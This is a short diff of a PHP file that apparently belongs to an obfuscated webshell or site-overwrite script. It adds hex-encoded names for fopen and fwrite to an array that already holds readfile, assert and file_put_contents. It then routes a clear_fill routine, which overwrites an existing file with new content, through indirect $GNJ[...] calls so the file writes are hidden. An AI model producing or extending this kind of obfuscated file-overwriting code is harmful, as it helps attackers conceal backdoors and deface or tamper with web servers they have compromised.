@@ -280,6 +280,8 @@ $Array = [
 	'7265616466696c65',
 	'617373657274',
 	'66696c655f7075745f636f6e74656e7473',
+	'666f70656e',
+	'667772697465',
 ];
 $___ = count($Array);
 for ($i = 0; $i < $___; $i++) {
@@ -1293,9 +1295,9 @@ Satisfy Any
 			function clear_fill($file, $index)
 			{
 				if (file_exists($file)) {
-					$handle = fopen($file, 'w');
-					fwrite($handle, '');
-					fwrite($handle, $index);
+					$handle = $GNJ[40]($file, 'w');
+					$GNJ[41]($handle, '');
+					$GNJ[41]($handle, $index);
 					fclose($handle);
 				}
 			}
